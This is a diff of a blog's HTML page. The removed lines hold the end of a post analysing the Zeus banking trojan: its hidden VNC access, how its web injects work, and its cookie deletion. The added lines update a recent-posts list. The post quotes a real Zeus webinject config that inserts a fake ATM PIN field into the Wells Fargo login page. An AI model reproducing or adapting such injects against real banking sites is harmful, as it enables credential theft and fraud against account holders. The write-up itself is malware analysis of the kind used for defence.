-<p>Next, the attacker can sit and watch hes Back Connect Server&rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate <strong>display</strong>, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&rsquo;s almost as if hes attaching to another <em>tty</em>.</p>
-
-<p><img src="http://i.imgur.com/7tg4l2X.png"></p>
-
-<h3>Web Injects, the real threat.</h3>
-
-<p>So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called <strong>Web Injects</strong> to manipulate website content. &ldquo;What do you mean by &lsquo;manipulation&rsquo;?&rdquo; you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command &amp; Control server. Just like the one we just used to Remotely Administer the infected machines.</p>
-
-<p>With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.</p>
-
-<h4>How it works</h4>
-
-<p>When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API&rsquo;s in Windows, it is able to monitor for its configured URL&rsquo;s, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source <a href="https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63">here</a>.</p>
-
-<figure class='code'><figcaption><span>Wellsfargo Web Inject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>set_url https://www.wellsfargo.com/* G
-</span><span class='line'>data_before
-</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span><span class="err">*&lt;/</span><span class="na">span</span><span class="nt">&gt;</span>
-</span><span class='line'>data_end
-</span><span class='line'>data_inject
-</span><span class='line'><span class="nt">&lt;br&gt;&lt;strong&gt;&lt;label</span> <span class="na">for=</span><span class="s">&quot;atmpin&quot;</span><span class="nt">&gt;</span>ATM PIN<span class="nt">&lt;/label&gt;</span>:<span class="nt">&lt;/strong&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
-</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">accesskey=</span><span class="s">&quot;A&quot;</span> <span class="na">id=</span><span class="s">&quot;atmpin&quot;</span> <span class="na">name=</span><span class="s">&quot;USpass&quot;</span> <span class="na">size=</span><span class="s">&quot;13&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;14&quot;</span> <span class="na">style=</span><span class="s">&quot;width:147px&quot;</span> <span class="na">tabindex=</span><span class="s">&quot;2&quot;</span> <span class="nt">/&gt;&lt;/span&gt;</span>
-</span><span class='line'>data_end
-</span><span class='line'>data_after
-</span><span class='line'>data_end
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In the above extract from the web injects we can see that the http<strong>s</strong>://wellsfargo.com (note the s) website will have a extra field added, asking for a <em>ATM PIN</em> before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;C.</p>
-
-<p><img src="http://npercoco.typepad.com/.a/6a0133f264aa62970b01910426b229970c-pi"></p>
-
-<h3>Summary</h3>
-
-<p>While Zeus itself is old news and many variants such as <a href="http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf">Citadel</a> have sprung up, I believe this is still a very valid threat as the concepts remain the same.</p>
-
-<p>A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/4">&larr; Older</a>
@@ -1565,6 +1625,10 @@ Looking at the server, we see that the message is received:</p>
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
@@ -1600,10 +1664,6 @@ Looking at the server, we see that the message is received:</p>
     
       <li class="post">
         <a href="/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/">Zeus - My Adventure with a Infamous Bot</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console/">KVM - Redirecting CentOS Kernel and tty output to a virtual serial console</a>
       </li>
     
   </ul>
